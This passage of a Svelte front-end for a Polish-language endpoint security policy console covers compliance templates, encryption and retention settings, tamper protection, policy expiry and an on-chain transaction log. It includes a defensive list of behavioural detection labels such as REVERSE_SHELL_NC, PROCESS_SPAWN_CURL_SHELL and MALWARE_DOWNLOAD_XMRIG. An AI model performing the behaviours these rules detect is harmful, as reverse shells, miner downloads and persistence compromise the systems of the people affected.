              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Tamper Protection:</span>
                <span style="color: {details.tamper ? '#10b981' : '#f59e0b'}; font-weight: 600;">
                  {details.tamper ? '🟢 Aktywna' : '🟡 Wyłączona'}
                </span>
              </div>
              <div style="display: flex; justify-content: space-between; padding-bottom: 4px;">
                <span style="color: #64748b;">Termin ważności:</span>
                <span style="color: #cbd5e1;">{new Date(details.expiry).toLocaleString("pl-PL")}</span>
              </div>
            </div>

            <div style="display: flex; gap: 12px; justify-content: flex-end; margin-top: 8px;">
              <button 
                style="background: transparent; border: 1px solid rgba(255, 255, 255, 0.12); color: #cbd5e1; padding: 10px 18px; border-radius: 8px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s;"
                on:click={() => selectedAuditLog = null}
              >
                Zamknij
              </button>
              <button 
                class="btn-primary" 
                style="background: linear-gradient(135deg, #38bdf8 0%, #0369a1 100%); padding: 10px 18px; font-size: 13px; font-weight: 600;"
                on:click={restoreSelectedPolicy}
              >
                🔄 Przywróć do Edytora
              </button>
            </div>

          </div>
        </div>
      {/if}
      <div class="vm-tab-panel">
        <div class="panel glass-panel" style="width: 100%; box-sizing: border-box; display: flex; flex-direction: column; gap: 24px;">
          
          {#if !isSlushConnected}
            <!-- Gated view -->
            <div style="text-align: center; padding: 60px 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px;">
              <span style="font-size: 54px; filter: drop-shadow(0 0 10px rgba(56,189,248,0.3));">🛡️</span>
              <h3 style="margin: 0; font-size: 22px; font-weight: 700; color: #f1f5f9;">Polonium Configuration Console</h3>
              <p style="max-width: 500px; font-size: 14px; color: #94a3b8; line-height: 1.6; margin: 0 0 12px 0;">
                Dostęp do konfiguracji polityk bezpieczeństwa dystrybuowanych do agentów Thorium jest zablokowany. Podłącz swój portfel administratorski Slush, aby zalogować się do konsoli on-chain Polonium.
              </p>
              <button class="btn-primary" style="background: linear-gradient(135deg, #38bdf8 0%, #0369a1 100%); padding: 12px 24px; font-size: 14px; font-weight: 600;" on:click={openWalletModal}>
                🔌 Połącz Slush Wallet
              </button>
            </div>
          {:else}
            <!-- Connected Admin Editor view -->
            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.08); padding-bottom: 16px;">
              <div>
                <h3 style="margin: 0; font-size: 18px; font-weight: 600; display: flex; align-items: center; gap: 8px;">🛡️ Zarządzanie Politykami Polonium (On-Chain)</h3>
                <p style="margin: 4px 0 0 0; font-size: 12px; color: #94a3b8;">
                  Konfiguracja reguł bezpieczeństwa przechowywanych jako obiekt współdzielony na Sui Testnet.
                </p>
              </div>
              <div style="display: flex; align-items: center; gap: 12px;">
                {#if isPoloniumExpired}
                  <span style="font-size: 12px; background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); padding: 4px 10px; border-radius: 6px; font-weight: bold; display: flex; align-items: center; gap: 6px;">
                    🔴 WYGASŁA (Wymagany Audyt)
                  </span>
                {:else}
                  <span style="font-size: 12px; background: rgba(16, 185, 129, 0.1); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.2); padding: 4px 10px; border-radius: 6px; font-weight: 500; display: flex; align-items: center; gap: 6px;">
                    🟢 Aktywna (Ważna do: {poloniumExpiryDateString})
                  </span>
                {/if}
                <span style="font-size: 12px; background: rgba(255, 255, 255, 0.05); color: #cbd5e1; border: 1px solid rgba(255, 255, 255, 0.1); padding: 4px 10px; border-radius: 6px; font-weight: 500; display: flex; align-items: center; gap: 6px;">
                  <span style="width: 6px; height: 6px; background: #38bdf8; border-radius: 50%;"></span>
                  Autoryzowano: Admin C2
                </span>
              </div>
            </div>

            <!-- Smart Contract & Decentralized Storage Info Card -->
            <div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 18px; display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px;">
              <div style="display: flex; flex-direction: column; gap: 4px;">
                <span style="font-size: 10px; color: #64748b; font-weight: 700; text-transform: uppercase;">Kontrakt Polonium (Sui)</span>
                <span style="font-size: 12px; color: #e2e8f0; font-family: monospace;" title="0x7c49...4db1::polonium_policy">0x7c49...4db1</span>
              </div>
              <div style="display: flex; flex-direction: column; gap: 4px;">
                <span style="font-size: 10px; color: #64748b; font-weight: 700; text-transform: uppercase;">Walrus Storage (Blob ID)</span>
                <span style="font-size: 12px; color: #38bdf8; font-family: monospace; text-overflow: ellipsis; overflow: hidden; white-space: nowrap;" title={walrusBlobId}>{walrusBlobId}</span>
              </div>
              <div style="display: flex; flex-direction: column; gap: 4px;">
                <span style="font-size: 10px; color: #64748b; font-weight: 700; text-transform: uppercase;">Integracja z Foką</span>
                <span style="font-size: 12px; color: #10b981; font-weight: 600; display: flex; align-items: center; gap: 4px;">🦭 {fokaKeyStatus}</span>
              </div>
              <div style="display: flex; flex-direction: column; gap: 4px;">
                <span style="font-size: 10px; color: #64748b; font-weight: 700; text-transform: uppercase;">Integrity SHA-256 (On-chain)</span>
                <span style="font-size: 12px; color: #cbd5e1; font-family: monospace;" title={policyHash}>{policyHash.substring(0, 12)}...{policyHash.substring(58)}</span>
              </div>
            </div>

            <!-- Compliance Templates Selector -->
            <div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 18px; display: flex; flex-direction: column; gap: 12px;">
              <div style="font-size: 11px; color: #64748b; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em;">Wybierz Szablon Zgodności Regulacyjnej:</div>
              <div style="display: flex; gap: 12px; flex-wrap: wrap;">
                <button 
                  style="flex: 1; min-width: 140px; background: {selectedComplianceTemplate === 'nis2' ? 'rgba(56, 189, 248, 0.15)' : 'rgba(255, 255, 255, 0.02)'}; border: 1px solid {selectedComplianceTemplate === 'nis2' ? '#38bdf8' : 'rgba(255, 255, 255, 0.08)'}; border-radius: 8px; padding: 12px; color: white; cursor: pointer; text-align: left; transition: all 0.2s;"
                  on:click={() => applyCompliancePreset('nis2')}
                >
                  <div style="font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 6px;">
                    🇪🇺 Szablon NIS 2
                  </div>
                  <div style="font-size: 10px; color: #94a3b8; margin-top: 4px; line-height: 1.3;">Infrastruktura krytyczna, silne AI, wysoki rygor aktualizacji oprogramowania (7 dni).</div>
                </button>
                <button 
                  style="flex: 1; min-width: 140px; background: {selectedComplianceTemplate === 'rodo' ? 'rgba(16, 185, 129, 0.15)' : 'rgba(255, 255, 255, 0.02)'}; border: 1px solid {selectedComplianceTemplate === 'rodo' ? '#10b981' : 'rgba(255, 255, 255, 0.08)'}; border-radius: 8px; padding: 12px; color: white; cursor: pointer; text-align: left; transition: all 0.2s;"
                  on:click={() => applyCompliancePreset('rodo')}
                >
                  <div style="font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 6px;">
                    🛡️ Szablon GDPR / RODO
                  </div>
                  <div style="font-size: 10px; color: #94a3b8; margin-top: 4px; line-height: 1.3;">Prywatność danych osobowych, retencja logów 730 dni, szyfrowanie AES-256-GCM.</div>
                </button>
                <button 
                  style="flex: 1; min-width: 140px; background: {selectedComplianceTemplate === 'soc2' ? 'rgba(139, 92, 246, 0.15)' : 'rgba(255, 255, 255, 0.02)'}; border: 1px solid {selectedComplianceTemplate === 'soc2' ? '#8b5cf6' : 'rgba(255, 255, 255, 0.08)'}; border-radius: 8px; padding: 12px; color: white; cursor: pointer; text-align: left; transition: all 0.2s;"
                  on:click={() => applyCompliancePreset('soc2')}
                >
                  <div style="font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 6px;">
                    ⚙️ Szablon SOC 2 Type II
                  </div>
                  <div style="font-size: 10px; color: #94a3b8; margin-top: 4px; line-height: 1.3;">Ciągłe skanowanie podatności (12h), ochrona przed manipulacją, audyt dostępu.</div>
                </button>
                <button 
                  style="flex: 1; min-width: 140px; background: {selectedComplianceTemplate === 'hipaa' ? 'rgba(236, 72, 153, 0.15)' : 'rgba(255, 255, 255, 0.02)'}; border: 1px solid {selectedComplianceTemplate === 'hipaa' ? '#ec4899' : 'rgba(255, 255, 255, 0.08)'}; border-radius: 8px; padding: 12px; color: white; cursor: pointer; text-align: left; transition: all 0.2s;"
                  on:click={() => applyCompliancePreset('hipaa')}
                >
                  <div style="font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 6px;">
                    🏥 Szablon HIPAA (Zdrowie)
                  </div>
                  <div style="font-size: 10px; color: #94a3b8; margin-top: 4px; line-height: 1.3;">Ochrona ePHI, retencja logów 6 lat (2190 dni), wdrożenie łatek krytycznych w 5 dni.</div>
                </button>
                <button 
                  style="flex: 1; min-width: 140px; background: {selectedComplianceTemplate === 'pcidss' ? 'rgba(245, 158, 11, 0.15)' : 'rgba(255, 255, 255, 0.02)'}; border: 1px solid {selectedComplianceTemplate === 'pcidss' ? '#f59e0b' : 'rgba(255, 255, 255, 0.08)'}; border-radius: 8px; padding: 12px; color: white; cursor: pointer; text-align: left; transition: all 0.2s;"
                  on:click={() => applyCompliancePreset('pcidss')}
                >
                  <div style="font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 6px;">
                    💳 Szablon PCI DSS v4
                  </div>
                  <div style="font-size: 10px; color: #94a3b8; margin-top: 4px; line-height: 1.3;">Ochrona CDE, wdrożenie łatek krytycznych w 3 dni, silna kontrola dostępowa SOC.</div>
                </button>
                <button 
                  style="flex: 1; min-width: 140px; background: {selectedComplianceTemplate === 'dora' ? 'rgba(14, 165, 233, 0.15)' : 'rgba(255, 255, 255, 0.02)'}; border: 1px solid {selectedComplianceTemplate === 'dora' ? '#0ea5e9' : 'rgba(255, 255, 255, 0.08)'}; border-radius: 8px; padding: 12px; color: white; cursor: pointer; text-align: left; transition: all 0.2s;"
                  on:click={() => applyCompliancePreset('dora')}
                >
                  <div style="font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 6px;">
                    🏦 Szablon DORA (Finanse)
                  </div>
                  <div style="font-size: 10px; color: #94a3b8; margin-top: 4px; line-height: 1.3;">Odporność cyfrowa UE, retencja logów 5 lat (1825 dni), stały monitoring anomalii.</div>
                </button>
                <button 
                  style="flex: 1; min-width: 140px; background: {selectedComplianceTemplate === 'custom' ? 'rgba(255, 255, 255, 0.08)' : 'rgba(255, 255, 255, 0.02)'}; border: 1px solid {selectedComplianceTemplate === 'custom' ? 'rgba(255, 255, 255, 0.25)' : 'rgba(255, 255, 255, 0.08)'}; border-radius: 8px; padding: 12px; color: white; cursor: pointer; text-align: left; transition: all 0.2s;"
                  on:click={() => selectedComplianceTemplate = 'custom'}
                >
                  <div style="font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 6px;">
                    ✏️ Własna (Custom)
                  </div>
                  <div style="font-size: 10px; color: #94a3b8; margin-top: 4px; line-height: 1.3;">Ręczna konfiguracja zaawansowanych parametrów szyfrowania i retencji.</div>
                </button>
              </div>
            </div>

            <!-- Main Policy Settings Grid -->
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px;">
              
              <!-- Left Side: Signature-Based Scanning Policy -->
              <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 16px;">
                <div style="display: flex; align-items: center; gap: 8px;">
                  <span style="font-size: 20px;">💾</span>
                  <h4 style="margin: 0; font-size: 15px; font-weight: 600; color: #f1f5f9;">Polityka Sygnatur Szkodliwego Oprogramowania</h4>
                </div>
                
                <p style="font-size: 12px; color: #94a3b8; line-height: 1.5; margin: 0;">
                  Domyślna konfiguracja Polonium wymaga, aby każda podłączona maszyna z zainstalowanym agentem Thorium przechowywała aktualną kopię publicznej listy najpopularniejszych metod ataku złośliwego oprogramowania.
                </p>

                <div style="display: flex; flex-direction: column; gap: 12px; margin-top: 8px;">
                  <div>
                    <div style="font-size: 12px; color: #cbd5e1; font-weight: 500; display: flex; justify-content: space-between; margin-bottom: 6px;">
                      <span>Minimalna ilość haszy sygnatur:</span>
                      <span style="color: #38bdf8; font-weight: 600; font-family: monospace;">{poloniumMinHashes}</span>
                    </div>
                    <input type="range" min="50" max="300" step="10" bind:value={poloniumMinHashes} style="width: 100%;" disabled={savingPoloniumConfig} aria-label="Minimalna ilość haszy sygnatur" />
                  </div>

                  <div>
                    <div style="font-size: 12px; color: #cbd5e1; font-weight: 500; display: flex; justify-content: space-between; margin-bottom: 6px;">
                      <span>Maksymalna ilość haszy sygnatur:</span>
                      <span style="color: #38bdf8; font-weight: 600; font-family: monospace;">{poloniumMaxHashes}</span>
                    </div>
                    <input type="range" min="500" max="2000" step="50" bind:value={poloniumMaxHashes} style="width: 100%;" disabled={savingPoloniumConfig} aria-label="Maksymalna ilość haszy sygnatur" />
                  </div>
                </div>

                <div style="background: rgba(56, 189, 248, 0.06); border: 1px solid rgba(56, 189, 248, 0.15); padding: 12px; border-radius: 8px; font-size: 11px; color: #38bdf8; line-height: 1.4; margin-top: auto;">
                  💡 <strong>Bieżące zachowanie agenta:</strong> Agenci Thorium będą weryfikować uruchamiane procesy lokalnie za pomocą binarnej bazy sygnatur zawierającej od {poloniumMinHashes} do {poloniumMaxHashes} haszy.
                </div>
              </div>

              <!-- Right Side: Behavioral Analysis Policy -->
              <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 16px;">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                  <div style="display: flex; align-items: center; gap: 8px;">
                    <span style="font-size: 20px;">🧠</span>
                    <h4 style="margin: 0; font-size: 15px; font-weight: 600; color: #f1f5f9;">Polityka Analizy Behawioralnej AI</h4>
                  </div>
                  <label class="switch" style="position: relative; display: inline-block; width: 42px; height: 22px;">
                    <input type="checkbox" bind:checked={localAIEnabled} disabled={savingPoloniumConfig} style="opacity: 0; width: 0; height: 0;" />
                    <span class="slider round" style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: {localAIEnabled ? '#38bdf8' : '#334155'}; transition: .4s; border-radius: 34px;"></span>
                  </label>
                </div>

                <p style="font-size: 12px; color: #94a3b8; line-height: 1.5; margin: 0;">
                  Top 10 najpopularniejszych wzorców behawioralnych ataków malware, które są brane pod uwagę <strong>tylko i wyłącznie</strong> w momencie gdy lokalnie na stacji istnieje dedykowane AI do analizy.
                </p>

                <div style="background: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.03); border-radius: 8px; padding: 12px; max-height: 170px; overflow-y: auto;">
                  <div style="font-size: 11px; text-transform: uppercase; color: #64748b; font-weight: 700; margin-bottom: 8px;">Wzorce behawioralne (Top 10):</div>
                  <ul style="margin: 0; padding-left: 18px; font-size: 12px; color: #e2e8f0; display: flex; flex-direction: column; gap: 6px; font-family: monospace;">
                    <li>PROCESS_SPAWN_CURL_SHELL</li>
                    <li>SUSPICIOUS_PORT_SCAN_NMAP</li>
                    <li>REVERSE_SHELL_NC</li>
                    <li>SUDO_ESCAPE_ATTEMPT</li>
                    <li>MALWARE_DOWNLOAD_XMRIG</li>
                    <li>CRON_JOB_PERSISTENCE</li>
                    <li>SSH_BRUTE_FORCE_LOCAL</li>
                    <li>BINARY_REPLACEMENT_BIN</li>
                    <li>DNS_TUNNELING_PATTERN</li>
                    <li>MEM_STUFFING_EXPL</li>
                  </ul>
                </div>

                {#if localAIEnabled}
                  <div style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.15); padding: 10px; border-radius: 8px; font-size: 11px; color: #10b981;">
                    🟢 <strong>AI Analiza Aktywna:</strong> Wzorce behawioralne są aktywnie monitorowane na stacji <code>thorium-test</code> (Wykryto lokalnego agenta AI: Talus AI).
                  </div>
                {:else}
                  <div style="background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.15); padding: 10px; border-radius: 8px; font-size: 11px; color: #f59e0b;">
                    🟡 <strong>AI Analiza Wyłączona:</strong> Agenci Thorium będą ignorować powyższe wzorce behawioralne, polegając wyłącznie na sygnaturach haszy.
                  </div>
                {/if}
              </div>

              <!-- Advanced Compliance & Security Settings -->
              <div style="grid-column: span 2; background: rgba(255, 255, 255, 0.01); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 20px;">
                <div style="display: flex; align-items: center; gap: 8px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); padding-bottom: 12px;">
                  <span style="font-size: 20px;">⚙️</span>
                  <h4 style="margin: 0; font-size: 15px; font-weight: 600; color: #f1f5f9;">Zaawansowane Parametry Zgodności Regulacyjnej (Szyfrowane Foką)</h4>
                </div>

                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px;">
                  <!-- Row 1: Encryption at Rest & In Transit -->
                  <div style="display: flex; flex-direction: column; gap: 6px;">
                    <label for="data_rest_enc" style="font-size: 12px; color: #cbd5e1; font-weight: 600;">Szyfrowanie danych w spoczynku (Data-at-Rest):</label>
                    <select 
                      id="data_rest_enc"
                      bind:value={dataRestEncryption} 
                      style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 10px; font-size: 13px;"
                      disabled={savingPoloniumConfig || selectedComplianceTemplate !== 'custom'}
                    >
                      <option value="AES-256-GCM">AES-256-GCM (Zalecane / NIS2)</option>
                      <option value="AES-256-CBC">AES-256-CBC (Legacy)</option>
                      <option value="ChaCha20-Poly1305">ChaCha20-Poly1305 (Szybkie / Mobilne)</option>
                      <option value="Disabled">Brak szyfrowania (Wysokie Ryzyko)</option>
                    </select>
                  </div>

                  <div style="display: flex; flex-direction: column; gap: 6px;">
                    <label for="network_enc" style="font-size: 12px; color: #cbd5e1; font-weight: 600;">Minimalna wersja protokołu sieciowego (Data-in-Transit):</label>
                    <select 
                      id="network_enc"
                      bind:value={networkEncryption} 
                      style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 10px; font-size: 13px;"
                      disabled={savingPoloniumConfig || selectedComplianceTemplate !== 'custom'}
                    >
                      <option value="TLS-1.3">TLS 1.3 (Zalecane / forward secrecy)</option>
                      <option value="TLS-1.2">TLS 1.2 (Kompatybilność)</option>
                      <option value="None">Brak szyfrowania (Niezalecane)</option>
                    </select>
                  </div>

                  <!-- Row 2: Incident Response & Patch Management -->
                  <div style="display: flex; flex-direction: column; gap: 6px;">
                    <label for="ir_groups" style="font-size: 12px; color: #cbd5e1; font-weight: 600;">Uprawnione grupy reagowania na incydenty (Incident Response):</label>
                    <input 
                      id="ir_groups"
                      type="text" 
                      bind:value={incidentResponseGroups}
                      placeholder="np. security-admins, soc-core"
                      style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 10px; font-size: 13px; outline: none;"
                      disabled={savingPoloniumConfig || selectedComplianceTemplate !== 'custom'}
                    />
                  </div>

                  <div style="display: flex; flex-direction: column; gap: 6px;">
                    <label for="patch_delay" style="font-size: 12px; color: #cbd5e1; font-weight: 600;">Maksymalny wiek poprawek krytycznych (Software Update Policy):</label>
                    <div style="display: flex; align-items: center; gap: 10px;">
                      <input 
                        id="patch_delay"
                        type="number" 
                        bind:value={updateMaxDelayDays}
                        min="1" max="90"
                        style="width: 80px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 10px; font-size: 13px; text-align: center;"
                        disabled={savingPoloniumConfig || selectedComplianceTemplate !== 'custom'}
                      />
                      <span style="font-size: 12px; color: #94a3b8;">dni od publikacji poprawki (NIS2: max 14 dni)</span>
                    </div>
                  </div>

                  <!-- Row 3: Audit Log & Vulnerability Scans & Tamper Protection -->
                  <div style="display: flex; flex-direction: column; gap: 6px;">
                    <label for="log_retention" style="font-size: 12px; color: #cbd5e1; font-weight: 600;">Okres retencji logów audytowych na endpointach:</label>
                    <div style="display: flex; align-items: center; gap: 10px;">
                      <input 
                        id="log_retention"
                        type="number" 
                        bind:value={auditLogRetentionDays}
                        min="30" max="3650"
                        style="width: 80px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 10px; font-size: 13px; text-align: center;"
                        disabled={savingPoloniumConfig || selectedComplianceTemplate !== 'custom'}
                      />
                      <span style="font-size: 12px; color: #94a3b8;">dni (SOC2/RODO wymaga min. 90-365 dni)</span>
                    </div>
                  </div>

                  <div style="display: flex; flex-direction: column; gap: 6px;">
                    <label for="vuln_cycle" style="font-size: 12px; color: #cbd5e1; font-weight: 600;">Częstotliwość skanowania podatności (Vulnerability Scan Cycle):</label>
                    <select 
                      id="vuln_cycle"
                      bind:value={vulnScanCycle} 
                      style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 10px; font-size: 13px;"
                      disabled={savingPoloniumConfig || selectedComplianceTemplate !== 'custom'}
                    >
                      <option value="12h">Co 12 godzin (Ciągły monitoring)</option>
                      <option value="daily">Codziennie (Standard SOC2)</option>
                      <option value="weekly">Raz w tygodniu</option>
                    </select>
                  </div>

                  <div style="grid-column: span 2; display: flex; align-items: center; gap: 10px; margin-top: 10px; background: rgba(255,255,255,0.02); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                    <input 
                      type="checkbox" 
                      id="tamper_protection"
                      bind:checked={tamperProtection} 
                      style="width: 16px; height: 16px; cursor: pointer;"
                      disabled={savingPoloniumConfig || selectedComplianceTemplate !== 'custom'}
                    />
                    <label for="tamper_protection" style="font-size: 12px; color: #cbd5e1; cursor: pointer; display: flex; flex-direction: column; gap: 2px;">
                      <strong>Aktywuj ochronę przed manipulacją agenta (Agent Tamper Protection)</strong>
                      <span style="font-size: 10px; color: #64748b;">Zapobiega nieautoryzowanemu wyłączeniu lub odinstalowaniu agenta Thorium bez podpisu klucza Sui Seal.</span>
                    </label>
                  </div>

                </div>
              </div>

              <!-- Expiry & Audit Policy Card -->
              <div style="grid-column: span 2; background: rgba(255, 255, 255, 0.01); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 16px;">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                  <div style="display: flex; align-items: center; gap: 8px;">
                    <span style="font-size: 20px;">📅</span>
                    <h4 style="margin: 0; font-size: 15px; font-weight: 600; color: #f1f5f9;">Termin Ważności i Wymuszenie Audytu</h4>
                  </div>
                  
                  <div style="display: flex; align-items: center; gap: 12px;">
                    <span style="font-size: 12px; color: #94a3b8;">Status Polityki:</span>
                    {#if isPoloniumExpired}
                      <span style="font-size: 12px; background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); padding: 4px 10px; border-radius: 6px; font-weight: bold; display: flex; align-items: center; gap: 6px;">
                        🔴 WYGASŁA (Wymagany Pilny Audyt)
                      </span>
                    {:else}
                      <span style="font-size: 12px; background: rgba(16, 185, 129, 0.1); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.2); padding: 4px 10px; border-radius: 6px; font-weight: 500; display: flex; align-items: center; gap: 6px;">
                        🟢 Aktywna (Ważna do: {poloniumExpiryDateString})
                      </span>
                    {/if}
                  </div>
                </div>

                <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 20px; align-items: center;">
                  <p style="font-size: 12px; color: #94a3b8; line-height: 1.5; margin: 0;">
                    Ustaw termin ważności polityki, aby wymusić regularną recenzję (audyt) konfiguracji bezpieczeństwa. Po wygaśnięciu stacje końcowe Thorium oznaczą politykę jako nieaktualną, a konsola zablokuje dalszą dystrybucję do czasu zatwierdzenia nowego audytu.
                  </p>
                  
                  <div>
                    <div style="font-size: 11px; color: #64748b; font-weight: 700; text-transform: uppercase; display: block; margin-bottom: 6px;">Wybierz cykl ważności:</div>
                    <select 
                      bind:value={poloniumLifespan} 
                      style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 10px; font-size: 13px; font-weight: 600; cursor: pointer; outline: none;"
                      disabled={savingPoloniumConfig}
                    >
                      <option value="30">30 dni (Zalecane)</option>
                      <option value="90">90 dni (Standard)</option>
                      <option value="year1">1 rok</option>
                      <option value="year2">2 lata</option>
                      <option value="year3">3 lata</option>
                      <option value="year5">5 lat</option>
                      <option value="year10">10 lat</option>
                      <option value="dynamic">🧬 Dynamiczna (Poziom Zagrożeń - Eksperymentalna)</option>
                      <option value="1">1 minuta (Testy dynamiczne)</option>
                      <option value="expired">Wymuś Wygaśnięcie (Test audytu)</option>
                    </select>
                  </div>
                </div>
                {#if poloniumLifespan === "dynamic"}
                  <div style="background: rgba(56, 189, 248, 0.05); border: 1px dashed rgba(56, 189, 248, 0.25); padding: 12px; border-radius: 8px; font-size: 11px; color: #38bdf8; display: flex; align-items: center; gap: 8px; margin-top: 4px; line-height: 1.4;">
                    <span>🧬</span>
                    <div>
                      <strong>Eksperymentalny kalkulator ryzyka:</strong> Wykryto aktywny incydent o statusie <strong>CRITICAL</strong> na stacji klienckiej. Bezpieczny czas życia nowej polityki został dynamicznie skrócony do <strong>{dynamicExpirationDays} dnia (24h)</strong> w celu wymuszenia szybkiego audytu.
                    </div>
                  </div>
                {/if}
              </div>

            </div>

            <!-- Submit Policy & Status row -->
            <div style="border-top: 1px solid rgba(255, 255, 255, 0.08); padding-top: 20px; display: flex; justify-content: space-between; align-items: center; margin-top: 12px;">
              <div style="font-size: 13px; color: #38bdf8; font-weight: 500;">
                {#if savingPoloniumConfig}
                  <div style="display: flex; align-items: center; gap: 10px;">
                    <div style="width: 16px; height: 16px; border: 2px solid rgba(56, 189, 248, 0.2); border-top-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite;"></div>
                    <span>{poloniumStatusMessage}</span>
                  </div>
                {/if}
              </div>
              <button 
                class="btn-primary" 
                style="background: linear-gradient(135deg, #10b981 0%, #047857 100%); border: none; padding: 12px 28px; font-size: 13px; font-weight: 600;"
                on:click={handleSavePoloniumConfig}
                disabled={savingPoloniumConfig}
              >
                {savingPoloniumConfig ? "Zapisywanie..." : "💾 Zapisz i Dystrybuuj Politykę"}
              </button>
            </div>

            <!-- Transaction Log -->
            <div style="margin-top: 10px;">
              <h4 style="margin: 0 0 12px 0; font-size: 14px; font-weight: 600; color: #cbd5e1; display: flex; align-items: center; gap: 6px;">
                📜 Log Transakcji On-Chain Polityk Polonium
              </h4>
              <div style="background: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.03); border-radius: 8px; max-height: 180px; overflow-y: auto;">
                <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 12px;">
                  <thead>
                    <tr style="border-bottom: 1px solid rgba(255, 255, 255, 0.05); color: #64748b;">
                      <th style="padding: 10px;">Czas</th>
                      <th style="padding: 10px;">Skrót Tx</th>
                      <th style="padding: 10px;">Opis Operacji</th>
                      <th style="padding: 10px; text-align: right;">Status</th>
                    </tr>
                  </thead>
                  <tbody>
                    {#each poloniumLogs as log}
                      <tr style="border-bottom: 1px solid rgba(255, 255, 255, 0.02); color: #cbd5e1;">
                        <td style="padding: 10px; color: #94a3b8;">{log.time}</td>
                        <td style="padding: 10px; font-family: monospace; color: #38bdf8;">{log.tx}</td>
                        <td style="padding: 10px;">{log.desc}</td>
                        <td style="padding: 10px; text-align: right; display: flex; gap: 8px; justify-content: flex-end; align-items: center;">
                          <span style="background: rgba(16, 185, 129, 0.15); color: #10b981; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: 600;">{log.status}</span>
                          <button 
                            style="background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.2); color: #38bdf8; padding: 3px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; cursor: pointer; transition: all 0.2s;"
                            on:click={() => selectedAuditLog = log}
                          >
                            🔍 Audyt / Przywróć
                          </button>
                        </td>
                      </tr>
                    {/each}
                  </tbody>
                </table>
              </div>
            </div>
          {/if}
        </div>
      </div>
    {/if}

    <!-- Vulnerabilities Tab -->
    {#if activeTab === "vulnerabilities"}
      <div class="vm-tab-panel">
        <div class="panel glass-panel" style="width: 100%; box-sizing: border-box; display: flex; flex-direction: column; gap: 20px;">
          {#if slushWalletAlert}
            <div style="background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #f87171; padding: 14px 18px; border-radius: 8px; font-size: 13px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center;">
              <span style="display: flex; align-items: center; gap: 8px;">⚠️ {slushWalletAlert}</span>
              <button style="background: none; border: none; color: #f87171; font-weight: bold; cursor: pointer; font-size: 14px;" on:click={() => slushWalletAlert = ""}>✕</button>
            </div>
          {/if}

          <div class="panel-header" style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding-bottom: 16px;">
            <div>
              <h3 style="margin: 0; font-size: 18px; font-weight: 600; display: flex; align-items: center; gap: 8px;">🦭 Rejestr Podatności Agenta (Zaszyfrowany Foką)</h3>
              <p style="margin: 4px 0 0 0; font-size: 12px; color: #94a3b8;">
                Dane podatności są zaszyfrowane kluczem Foki administratora. Dostęp wyłącznie podczas dochodzenia.
              </p>
            </div>
            <div>
              {#if isVulnerabilitiesDecrypted}
